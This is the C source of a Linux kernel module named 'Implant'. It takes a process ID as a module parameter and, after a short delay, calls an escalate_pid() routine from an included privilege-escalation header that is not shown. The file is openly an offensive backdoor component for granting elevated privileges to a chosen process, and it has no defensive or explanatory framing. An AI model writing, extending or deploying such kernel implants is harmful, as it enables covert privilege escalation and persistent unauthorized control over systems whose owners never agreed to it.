#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/delay.h>
#include <linux/sched.h>

#include <privilege_escalation.h>

MODULE_DESCRIPTION("Implant");
MODULE_AUTHOR("sc");
MODULE_LICENSE("GPL");

int target_pid = INVALID_PID;
module_param(target_pid, int, S_IRUSR | S_IWUSR);
MODULE_PARM_DESC(target_pid, "Process ID to escalate");

static int __init implant_init(void)
{
	printk(KERN_INFO
	       "[CORE] - Implant loaded, given pid %d (-1 means no pid given)\n",
	       target_pid);
	if (target_pid != INVALID_PID) {
		ssleep(5);
		escalate_pid(target_pid);
	}
	return 0;
}

static void __exit implant_exit(void)
{
	printk("Implant unloaded\n");
}

module_init(implant_init);
module_exit(implant_exit);
